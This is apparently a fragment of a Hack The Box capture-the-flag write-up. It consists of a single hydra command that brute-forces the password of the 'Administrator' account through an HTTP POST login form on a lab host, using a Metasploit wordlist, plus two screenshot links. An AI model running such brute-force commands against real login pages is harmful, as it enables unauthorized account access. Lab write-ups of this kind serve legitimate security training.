**Command:**
hydra -s 31936 -l Administrator -P /usr/share/metasploit-framework/data/wordlists/password.lst docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" 

![](request.png)
![](response.png)
